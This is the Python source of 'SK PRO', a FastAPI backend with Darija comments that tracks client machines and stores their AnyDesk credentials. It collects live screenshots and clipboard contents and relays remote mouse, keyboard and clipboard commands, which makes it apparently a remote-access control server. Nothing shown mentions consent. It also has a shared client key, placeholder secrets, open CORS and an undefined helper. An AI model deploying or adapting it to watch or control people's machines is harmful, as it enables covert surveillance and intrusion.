"""
═══════════════════════════════════════════════════════════════════
🌐 SK PRO — Backend Server
═══════════════════════════════════════════════════════════════════

FastAPI server l:
- Track users (online/offline, last seen)
- Receive logs mn users
- Manage commands (extend time, disconnect, block)
- Authenticated b API_KEY

Deploy 3la Railway.app (free tier kheddam mzyan)

Endpoints:
- POST /heartbeat    → user ki-3lim server "ana online"
- POST /log          → user ki-sift log entry
- GET  /commands     → user ki-jbed pending commands
- POST /command-ack  → user ki-confirm command done
- GET  /admin/users  → admin ki-yshof kolchi
- GET  /admin/logs   → admin ki-yshof logs
- POST /admin/extend → admin yzido wa9t l user
- POST /admin/disconnect → admin yforces disconnect
- POST /admin/block  → admin yblockki user
═══════════════════════════════════════════════════════════════════
"""
import os
import time
import sqlite3
import secrets
from datetime import datetime
from typing import Optional, List
from contextlib import contextmanager

from fastapi import FastAPI, HTTPException, Depends, Header, Request
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn

# ═══════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════
DB_PATH = os.getenv("DB_PATH", "skpro.db")

# 🔐 Admin API key (l admin) — bdel hadi !
ADMIN_API_KEY = os.getenv("ADMIN_API_KEY", "CHANGE_ME_ADMIN_SECRET_2024")

# 🔐 User API key (l user clients) — bdelha tani!
USER_API_KEY = os.getenv("USER_API_KEY", "CHANGE_ME_USER_SECRET_2024")

# Heartbeat: ila user ma ssi-3lim 3ndna f 2 minutes → offline
HEARTBEAT_TIMEOUT = 120

app = FastAPI(title="SK PRO Server", version="1.0")

# CORS (allow admin + user clients)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)


# ═══════════════════════════════════════════════════════════════════
# DATABASE
# ═══════════════════════════════════════════════════════════════════
@contextmanager
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    try:
        yield conn
        conn.commit()
    finally:
        conn.close()


def init_db():
    """Init tables ila mafichi"""
    with get_db() as db:
        db.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY,
            last_seen INTEGER,
            ip_address TEXT,
            os_info TEXT,
            current_status TEXT,
            expires_at INTEGER,
            blocked INTEGER DEFAULT 0,
            disconnect_requested INTEGER DEFAULT 0,
            anydesk_id TEXT,
            anydesk_password TEXT,
            created_at INTEGER,
            updated_at INTEGER
        );
        
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            timestamp INTEGER,
            level TEXT,
            message TEXT,
            details TEXT
        );
        
        CREATE INDEX IF NOT EXISTS idx_logs_user ON logs(username);
        CREATE INDEX IF NOT EXISTS idx_logs_ts ON logs(timestamp);
        
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            command TEXT,
            params TEXT,
            issued_at INTEGER,
            executed_at INTEGER,
            status TEXT DEFAULT 'pending'
        );
        
        CREATE INDEX IF NOT EXISTS idx_commands_user ON commands(username, status);
        """)


init_db()


def migrate_db():
    """Add new columns ila ma kayinch (l existing databases)"""
    with get_db() as db:
        cols = [r[1] for r in db.execute("PRAGMA table_info(users)").fetchall()]
        if "anydesk_id" not in cols:
            try:
                db.execute("ALTER TABLE users ADD COLUMN anydesk_id TEXT")
                db.execute("ALTER TABLE users ADD COLUMN anydesk_password TEXT")
                print("✅ Migrated DB: added anydesk fields")
            except Exception as e:
                print(f"⚠ Migration warning: {e}")


migrate_db()


# ═══════════════════════════════════════════════════════════════════
# AUTH
# ═══════════════════════════════════════════════════════════════════
def verify_admin_key(x_api_key: str = Header(...)):
    if x_api_key != ADMIN_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid admin API key")
    return True


def verify_user_key(x_api_key: str = Header(...)):
    if x_api_key != USER_API_KEY:
        raise HTTPException(status_code=401, detail="Invalid user API key")
    return True


# ═══════════════════════════════════════════════════════════════════
# MODELS
# ═══════════════════════════════════════════════════════════════════
class HeartbeatRequest(BaseModel):
    username: str
    os_info: Optional[str] = ""
    current_status: Optional[str] = "idle"


class LogEntry(BaseModel):
    username: str
    level: str = "info"  # info, success, warning, error
    message: str
    details: Optional[str] = None


class CommandAck(BaseModel):
    command_id: int
    status: str = "done"


class ExtendRequest(BaseModel):
    username: str
    additional_seconds: int


class DisconnectRequest(BaseModel):
    username: str
    reason: Optional[str] = "Admin requested"


class BlockRequest(BaseModel):
    username: str
    blocked: bool


# ═══════════════════════════════════════════════════════════════════
# USER ENDPOINTS (l clients)
# ═══════════════════════════════════════════════════════════════════
@app.post("/heartbeat")
async def heartbeat(req: HeartbeatRequest, request: Request, _: bool = Depends(verify_user_key)):
    """User ki-3lim server 'ana 7ay' kol 30s"""
    now = int(time.time())
    ip = request.client.host
    
    with get_db() as db:
        # Check ila blocked
        row = db.execute("SELECT blocked, disconnect_requested, expires_at FROM users WHERE username=?",
                         (req.username,)).fetchone()
        
        if row and row["blocked"]:
            raise HTTPException(status_code=403, detail="User blocked by admin")
        
        # Upsert
        db.execute("""
            INSERT INTO users (username, last_seen, ip_address, os_info, current_status, created_at, updated_at)
            VALUES (?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(username) DO UPDATE SET
                last_seen=excluded.last_seen,
                ip_address=excluded.ip_address,
                os_info=excluded.os_info,
                current_status=excluded.current_status,
                updated_at=excluded.updated_at
        """, (req.username, now, ip, req.os_info, req.current_status, now, now))
        
        # Return status to client
        return {
            "ok": True,
            "disconnect_requested": bool(row["disconnect_requested"]) if row else False,
            "expires_at": row["expires_at"] if row else None,
        }


@app.post("/log")
async def add_log(entry: LogEntry, _: bool = Depends(verify_user_key)):
    """User ki-sift log entry"""
    with get_db() as db:
        db.execute("""
            INSERT INTO logs (username, timestamp, level, message, details)
            VALUES (?, ?, ?, ?, ?)
        """, (entry.username, int(time.time()), entry.level, entry.message, entry.details))
        
        # Cleanup old logs (keep last 10000)
        db.execute("""
            DELETE FROM logs WHERE id NOT IN (
                SELECT id FROM logs ORDER BY id DESC LIMIT 10000
            )
        """)
    return {"ok": True}


@app.get("/commands/{username}")
async def get_commands(username: str, _: bool = Depends(verify_user_key)):
    """User ki-jbed pending commands l ihhna"""
    with get_db() as db:
        rows = db.execute("""
            SELECT id, command, params, issued_at FROM commands
            WHERE username=? AND status='pending'
            ORDER BY issued_at
        """, (username,)).fetchall()
        
        return {"commands": [dict(r) for r in rows]}


@app.post("/command-ack")
async def ack_command(req: CommandAck, _: bool = Depends(verify_user_key)):
    """User ki-confirm command done"""
    with get_db() as db:
        db.execute("""
            UPDATE commands SET status=?, executed_at=? WHERE id=?
        """, (req.status, int(time.time()), req.command_id))
    return {"ok": True}


@app.get("/check-expiration/{username}")
async def check_expiration(username: str, _: bool = Depends(verify_user_key)):
    """User ki-checki ila expiration tbedlat"""
    with get_db() as db:
        row = db.execute("SELECT expires_at, blocked FROM users WHERE username=?",
                         (username,)).fetchone()
        if not row:
            return {"expires_at": None, "blocked": False}
        return {"expires_at": row["expires_at"], "blocked": bool(row["blocked"])}


# ═══════════════════════════════════════════════════════════════════
# ADMIN ENDPOINTS
# ═══════════════════════════════════════════════════════════════════
@app.get("/admin/users")
async def list_users(_: bool = Depends(verify_admin_key)):
    """List kolchi users b status"""
    now = int(time.time())
    with get_db() as db:
        rows = db.execute("""
            SELECT username, last_seen, ip_address, os_info, current_status,
                   expires_at, blocked, disconnect_requested, anydesk_id, created_at
            FROM users
            ORDER BY last_seen DESC
        """).fetchall()
        
        users = []
        for r in rows:
            d = dict(r)
            d["online"] = (now - (d["last_seen"] or 0)) < HEARTBEAT_TIMEOUT
            d["seconds_since_seen"] = now - (d["last_seen"] or 0)
            users.append(d)
        
        return {"users": users}


@app.get("/admin/logs")
async def get_logs(username: Optional[str] = None, limit: int = 200,
                   since: Optional[int] = None,
                   _: bool = Depends(verify_admin_key)):
    """Get logs (filtered b username + since timestamp)"""
    with get_db() as db:
        query = "SELECT * FROM logs WHERE 1=1"
        params = []
        if username:
            query += " AND username=?"
            params.append(username)
        if since:
            query += " AND timestamp > ?"
            params.append(since)
        query += " ORDER BY id DESC LIMIT ?"
        params.append(limit)
        
        rows = db.execute(query, params).fetchall()
        return {"logs": [dict(r) for r in rows]}


@app.post("/admin/extend")
async def extend_user(req: ExtendRequest, _: bool = Depends(verify_admin_key)):
    """Admin yzido wa9t l user"""
    now = int(time.time())
    with get_db() as db:
        row = db.execute("SELECT expires_at FROM users WHERE username=?",
                         (req.username,)).fetchone()
        if row:
            current_exp = row["expires_at"] or now
            # Ila account expired, start mn now
            base = max(current_exp, now)
            new_exp = base + req.additional_seconds
        else:
            new_exp = now + req.additional_seconds
        
        # Insert/update
        db.execute("""
            INSERT INTO users (username, expires_at, created_at, updated_at)
            VALUES (?, ?, ?, ?)
            ON CONFLICT(username) DO UPDATE SET expires_at=?, updated_at=?
        """, (req.username, new_exp, now, now, new_exp, now))
        
        # Add command bash user yt-update directement
        db.execute("""
            INSERT INTO commands (username, command, params, issued_at)
            VALUES (?, 'extend_expiration', ?, ?)
        """, (req.username, str(new_exp), now))
        
        return {"ok": True, "new_expires_at": new_exp,
                "expires_in_seconds": new_exp - now}


@app.post("/admin/disconnect")
async def disconnect_user(req: DisconnectRequest, _: bool = Depends(verify_admin_key)):
    """Admin yforce disconnect dyal user"""
    now = int(time.time())
    with get_db() as db:
        db.execute("""
            UPDATE users SET disconnect_requested=1, updated_at=?
            WHERE username=?
        """, (now, req.username))
        
        db.execute("""
            INSERT INTO commands (username, command, params, issued_at)
            VALUES (?, 'disconnect', ?, ?)
        """, (req.username, req.reason or "Admin requested", now))
        
        return {"ok": True}


@app.post("/admin/block")
async def block_user(req: BlockRequest, _: bool = Depends(verify_admin_key)):
    """Admin yblock/unblock user"""
    now = int(time.time())
    with get_db() as db:
        db.execute("""
            INSERT INTO users (username, blocked, created_at, updated_at)
            VALUES (?, ?, ?, ?)
            ON CONFLICT(username) DO UPDATE SET blocked=?, updated_at=?
        """, (req.username, int(req.blocked), now, now, int(req.blocked), now))
    return {"ok": True}


@app.delete("/admin/clear-disconnect/{username}")
async def clear_disconnect(username: str, _: bool = Depends(verify_admin_key)):
    """Reset disconnect flag (mli admin baghi user y3awd login)"""
    with get_db() as db:
        db.execute("UPDATE users SET disconnect_requested=0 WHERE username=?",
                   (username,))
    return {"ok": True}



# ═══════════════════════════════════════════════════════════════════
# 📸 SCREEN MONITORING - Live screenshots
# ═══════════════════════════════════════════════════════════════════

# In-memory store: latest screenshot per user (RAM only, ma ki-stockerch f db)
# Format: {username: {"data": bytes, "timestamp": int}}
import base64
SCREENSHOTS_STORE = {}
WATCH_REQUESTS = {}  # {username: bool} — admin baghi yshof?


@app.post("/screen/upload")
async def upload_screenshot(request: Request, _: bool = Depends(verify_user_key)):
    """User ki-upload screenshot dyalo"""
    try:
        data = await request.json()
        username = data.get("username")
        image_b64 = data.get("image")
        if not username or not image_b64:
            raise HTTPException(400, "Missing data")
        
        # Store in RAM (ma n-stockerch f disk - too much I/O)
        SCREENSHOTS_STORE[username] = {
            "data": image_b64,
            "timestamp": int(time.time()),
        }
        return {"ok": True}
    except Exception as e:
        raise HTTPException(400, str(e))


@app.get("/screen/watch/{username}")
async def check_watch_status(username: str, _: bool = Depends(verify_user_key)):
    """User ki-checki ila admin baghi yshof"""
    return {"watching": WATCH_REQUESTS.get(username, False)}


@app.post("/admin/screen/start/{username}")
async def admin_start_watching(username: str, _: bool = Depends(verify_admin_key)):
    """Admin ki-bda yshof user"""
    WATCH_REQUESTS[username] = True
    return {"ok": True}


@app.post("/admin/screen/stop/{username}")
async def admin_stop_watching(username: str, _: bool = Depends(verify_admin_key)):
    """Admin ki-w9af yshof user"""
    WATCH_REQUESTS[username] = False
    # Clear screenshot
    SCREENSHOTS_STORE.pop(username, None)
    return {"ok": True}


@app.get("/admin/screen/{username}")
async def admin_get_screenshot(username: str, _: bool = Depends(verify_admin_key)):
    """Admin ki-jbed latest screenshot"""
    shot = SCREENSHOTS_STORE.get(username)
    if not shot:
        return {"image": None, "timestamp": None}
    
    # Ila screenshot 9dim bzaf (ktar mn 30s) → ma n-rj3ich
    if int(time.time()) - shot["timestamp"] > 30:
        return {"image": None, "timestamp": None, "stale": True}
    
    return {"image": shot["data"], "timestamp": shot["timestamp"]}


# ═══════════════════════════════════════════════════════════════════
# 🎮 REMOTE CONTROL: Mouse + Keyboard + Clipboard
# ═══════════════════════════════════════════════════════════════════

# Queue dyal events: {username: [event1, event2, ...]}
CONTROL_EVENTS = {}
CLIPBOARD_STORE = {}  # {username: {"text": "...", "timestamp": ...}}
CLIENTS_REGISTRY = {}  # {client_name: {"username": "...", "built_at": timestamp, "size_mb": 24.5}}

# Initialize with test clients (for demo)
import time
_now = int(time.time())
CLIENTS_REGISTRY = {
    "SK_PRO": {"built_at": _now, "size_mb": 30.5, "status": "ready"},
}


@app.post("/admin/control/{username}")
async def admin_send_control_event(
    username: str,
    request: Request,
    _: bool = Depends(verify_admin_key)
):
    """Admin ki-sift event (mouse/keyboard) l user"""
    try:
        event = await request.json()
        # Add to queue
        if username not in CONTROL_EVENTS:
            CONTROL_EVENTS[username] = []
        CONTROL_EVENTS[username].append({
            **event,
            "timestamp": int(time.time() * 1000)  # ms
        })
        # Limit queue size (avoid memory issues)
        if len(CONTROL_EVENTS[username]) > 100:
            CONTROL_EVENTS[username] = CONTROL_EVENTS[username][-50:]
        return {"ok": True}
    except Exception as e:
        raise HTTPException(400, str(e))


@app.get("/control/poll/{username}")
async def user_poll_control_events(
    username: str,
    _: bool = Depends(verify_user_key)
):
    """User ki-poll events l-y-ydir"""
    events = CONTROL_EVENTS.get(username, [])
    # Clear after fetch
    CONTROL_EVENTS[username] = []
    return {"events": events}


@app.post("/clipboard/sync")
async def sync_clipboard(request: Request, _: bool = Depends(verify_user_key)):
    """User ki-sift clipboard dyalo l server"""
    try:
        data = await request.json()
        username = data.get("username")
        text = data.get("text", "")
        if username:
            CLIPBOARD_STORE[username] = {
                "text": text[:50000],  # Max 50KB
                "timestamp": int(time.time())
            }
        return {"ok": True}
    except Exception as e:
        raise HTTPException(400, str(e))


@app.get("/admin/clipboard/{username}")
async def admin_get_clipboard(username: str, _: bool = Depends(verify_admin_key)):
    """Admin ki-jbed clipboard dyal user"""
    clip = CLIPBOARD_STORE.get(username)
    if not clip:
        return {"text": "", "timestamp": None}
    return clip


@app.post("/admin/clipboard/{username}")
async def admin_send_clipboard(
    username: str,
    request: Request,
    _: bool = Depends(verify_admin_key)
):
    """Admin ki-sift text l clipboard dyal user"""
    try:
        data = await request.json()
        text = data.get("text", "")
        # Add as control event
        if username not in CONTROL_EVENTS:
            CONTROL_EVENTS[username] = []
        CONTROL_EVENTS[username].append({
            "type": "clipboard_set",
            "text": text[:50000],
            "timestamp": int(time.time() * 1000)
        })
        return {"ok": True}
    except Exception as e:
        raise HTTPException(400, str(e))


# ═══════════════════════════════════════════════════════════════════
# 💻 CLIENT REGISTRY — Track built clients + versions
# ═══════════════════════════════════════════════════════════════════

@app.post("/admin/clients/register")
async def admin_register_client(
    request: Request,
    _: bool = Depends(verify_admin_key)
):
    """Admin registers newly built client"""
    try:
        data = await request.json()
        client_name = data.get("client_name", "")
        size_mb = data.get("size_mb", 0)
        
        if not client_name:
            raise HTTPException(400, "Missing client_name")
        
        CLIENTS_REGISTRY[client_name] = {
            "built_at": int(time.time()),
            "size_mb": size_mb,
            "status": "ready"
        }
        return {"ok": True, "client": client_name}
    except Exception as e:
        raise HTTPException(400, str(e))


@app.get("/admin/clients/list")
async def admin_list_clients(_: bool = Depends(verify_admin_key)):
    """Admin gets list dyal all built clients"""
    clients_list = []
    for client_name, info in CLIENTS_REGISTRY.items():
        # Check ila online
        try:
            user_info = get_user_by_name(client_name)
            online = user_info and user_info.get("online", False)
        except:
            online = False
        
        clients_list.append({
            "name": client_name,
            "built_at": info.get("built_at"),
            "size_mb": info.get("size_mb"),
            "online": online,
            "status": "online" if online else "offline"
        })
    
    return {"clients": clients_list, "count": len(clients_list)}


@app.get("/admin/clients/{client_name}")
async def admin_get_client(client_name: str, _: bool = Depends(verify_admin_key)):
    """Admin gets client info"""
    if client_name not in CLIENTS_REGISTRY:
        raise HTTPException(404, "Client not found")
    
    info = CLIENTS_REGISTRY[client_name]
    
    # Check online
    try:
        user_info = get_user_by_name(client_name)
        online = user_info and user_info.get("online", False)
    except:
        online = False
    
    return {
        "name": client_name,
        **info,
        "online": online
    }


@app.get("/")
async def root():
    return {
        "service": "SK PRO Server",
        "version": "1.0",
        "status": "online",
    }


@app.get("/health")
async def health():
    """Health check l Railway"""
    return {"status": "ok", "timestamp": int(time.time())}


if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    uvicorn.run("server:app", host="0.0.0.0", port=port, log_level="info")
